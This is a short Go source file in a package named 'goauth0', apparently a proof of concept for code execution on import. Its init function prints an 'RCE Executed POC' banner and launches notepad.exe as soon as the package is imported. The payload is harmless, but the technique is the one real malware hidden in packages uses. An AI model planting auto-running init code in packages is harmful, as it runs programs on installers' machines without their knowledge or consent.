package goauth0

import (
	"fmt"
	"os/exec"
)

func init() {
	fmt.Println("RCE Executed POC by W3shi")
	err := exec.Command("notepad.exe").Start()
	if err != nil {
		fmt.Println("Error launching Notepad:", err)
	}
}
